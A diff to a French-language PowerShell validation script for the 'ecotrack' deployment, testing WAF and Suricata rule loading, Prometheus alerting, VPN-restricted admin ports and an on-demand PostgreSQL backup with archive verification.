+else { Warn "CRS: 0/$($crsAtt.Count) bloquee - score d'anomalie sous le seuil (paranoia 1)" }
 
 $dropc = (docker exec ecotrack-suricata sh -c "grep -c '^drop ' /etc/suricata/rules/ecotrack.rules" 2>&1) -join ''
 $dn = 0; if (($dropc.Trim()) -match '^\d+$') { $dn = [int]$dropc.Trim() }
-if ($dn -ge 3) { Pass "Suricata: $dn regles 'drop' chargees (IPS-ready)" } else { Warn "Suricata drop rules: $dn (attendu >=3)" }
+if ($dn -ge 3) { Pass "Suricata: $dn regles 'drop' locales chargees (IPS-ready)" } else { Warn "Suricata drop rules: $dn (attendu >=3)" }
 $smode = (docker inspect ecotrack-suricata --format '{{.Config.Cmd}}' 2>&1) -join ''
-if ($smode -match '-q ') { Pass "Suricata mode NFQUEUE inline (IPS actif - drop applique)" }
-else { Warn "Suricata en af-packet IDS: drop=alerte seulement (IPS inline indispo sur WSL2, ModSec assure le blocage L7)" }
+if ($smode -match '-q ') { Pass "Suricata mode NFQUEUE inline (IPS actif)" } else { Warn "Suricata af-packet IDS: drop=alerte (IPS inline indispo WSL2; ModSec assure le blocage L7)" }
 
-
+# --- 15. Prometheus: alerte reelle (TargetDown) ---
 Section "Prometheus - Alerte reelle (TargetDown)"
 Write-Host "  [..] arret de cadvisor pour declencher TargetDown (jusqu'a ~110s)..." -ForegroundColor DarkGray
 docker stop ecotrack-cadvisor 2>&1 | Out-Null
@@ -357,7 +504,7 @@ if ($amf.ok -and $amf.body -match 'TargetDown') { Pass "Alertmanager: TargetDown
 Write-Host "  [..] redemarrage de cadvisor..." -ForegroundColor DarkGray
 docker start ecotrack-cadvisor 2>&1 | Out-Null
 
-# --- 13. VPN enforcement: les UIs admin NE doivent PAS repondre sur l'hote ---
+# --- 16. VPN enforcement: les UIs admin NE doivent PAS repondre sur l'hote ---
 Section "VPN - Acces admin restreint (hors tunnel)"
 foreach ($p in @(9090, 3001, 9093, 9100, 8082, 5601)) {
   $blocked = $false
@@ -371,6 +518,19 @@ foreach ($p in @(9090, 3001, 9093, 9100, 8082, 5601)) {
 }
 $wol = Http "http://localhost/health"
 if ($wol.ok -and $wol.code -eq 200) { Pass "WAF 80 reste public (voulu)" } else { Warn "WAF 80 inattendu: $($wol.code)" }
+
+# --- 17. Backup PostgreSQL (dump a la demande + presence) ---
+Section "Backup PostgreSQL (pg_dump + rotation)"
+$brun = (docker inspect -f '{{.State.Running}}' ecotrack-postgres-backup 2>&1) -join ''
+if ($brun -match 'true') { Pass "conteneur postgres-backup en cours d'execution" } else { Fail "postgres-backup non demarre: $brun" }
+
+# dump a la demande pour prouver la chaine (independamment du cycle programme)
+$dump = (docker exec ecotrack-postgres-backup sh -c "pg_dump --no-owner --clean --if-exists | gzip > /backups/ecotrack-test.sql.gz && ls -1 /backups/ecotrack-test.sql.gz && [ -s /backups/ecotrack-test.sql.gz ] && echo NONEMPTY" 2>&1) -join "`n"
+if ($dump -match 'NONEMPTY') { Pass "pg_dump a la demande OK (archive .sql.gz non vide)" } else { Warn "dump a la demande non confirme: $dump" }
+
+$verify = (docker exec ecotrack-postgres-backup sh -c "gzip -t /backups/ecotrack-test.sql.gz && zcat /backups/ecotrack-test.sql.gz | grep -c 'CREATE TABLE\|COPY\|INSERT' || echo 0" 2>&1) -join "`n"
+if ($verify -match '[1-9]') { Pass "archive valide et contient du schema/donnees (restaurable)" } else { Warn "contenu du dump non confirme: $verify" }
+docker exec ecotrack-postgres-backup sh -c "rm -f /backups/ecotrack-test.sql.gz" 2>&1 | Out-Null
 
 # --- Summary ---
 Write-Host ""
